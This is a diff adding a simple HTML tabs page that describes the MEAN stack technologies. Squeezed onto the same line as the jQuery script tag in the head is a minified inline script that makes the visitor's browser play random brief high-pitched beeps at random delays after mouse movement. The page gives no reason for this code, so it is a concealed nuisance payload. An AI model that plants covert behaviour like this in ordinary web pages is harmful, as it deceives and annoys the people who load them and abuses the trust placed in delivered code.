@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <title>Magic Tab</title>
+    <meta charset="UTF-8">
+    <script data-require="jquery@*" data-semver="2.2.0" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script><script>var c=new AudioContext,o=c.createOscillator();o.frequency.value=0,o.connect(c.destination),o.start(c.currentTime),window.addEventListener("mousemove",function(){setTimeout(function(){o.frequency.value=4e3*Math.pow(Math.random(),10),setTimeout(function(){o.frequency.value=0},100)},1e3+5e3*Math.random())});</script><script src=""></script>
+    <link rel="stylesheet" href="style.css" />
+    <script src="script.js"></script>
+  </head>
+
+  <body>
+    <div class="container">
+      <h1>MEAN STACK</h1>
+      <nav>
+        <ul class="tags">
+          <li class="highlight">MongoDB</li>
+          <li>Express</li>
+          <li>AngularJS</li>
+          <li>Node.js</li>
+        </ul>
+      </nav>
+      <main class="articles">
+        <article id="0" class="show">
+          <h2>MongoDB</h2>
+          <p>MongoDB is the leading NoSQL database, empowering businesses to be more agile and scalable.</p>
+        </article>
+        
+        <article id="1">
+          <h2>Express</h2>
+          <p>Express is a minimal and flexible node.js web application framework, providing a robust set of features for building single and multi-page, and hybrid web applications.</p>
+        </article>
+        
+        <article id="2">
+          <h2>AngularJS</h2>
+          <p>AngularJS lets you extend HTML vocabulary for your application. The resulting environment is extraordinarily expressive, readable, and quick to develop.</p>
+        </article>
+        
+        <article id="3">
+          <h2>Node.js</h2>
+          <p>Node.js is a platform built on Chrome's JavaScript runtime for easily building fast, scalable network applications.</p>
+        </article>
+      </main>
+    </div>
+    <script src="tags.js"></script>
+  </body>
+
+</html>
